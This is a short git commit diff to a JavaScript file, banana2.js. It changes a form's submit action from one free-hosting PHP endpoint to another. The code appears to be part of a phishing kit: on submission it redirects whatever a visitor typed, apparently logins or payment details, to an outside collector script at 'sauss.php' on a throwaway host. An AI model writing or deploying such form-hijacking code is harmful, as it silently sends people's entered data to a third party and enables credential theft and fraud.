69b9570d194bda80ca99b6f9bc43bb9948bb6eb5
manage-profiles-relate-practice <157689016+manage-profiles-relate-practice@users.noreply.github.com>
2024-01-25 17:03:25 +0700

    Update banana2.js

--- koncolodon/cupboard/banana2.js
+++ koncolodon/cupboard/banana2.js
@@ -1,3 +1,3 @@
 $("form").submit(function() {
-  $(myform).attr("action", "https://newyears-duaribuduaempat-go.000webhostapp.com/reguler/iurann.php");
+  $(myform).attr("action", "https://royoan-duaribuduaempat-comeon.000.pe/royoan/sauss.php");
 });
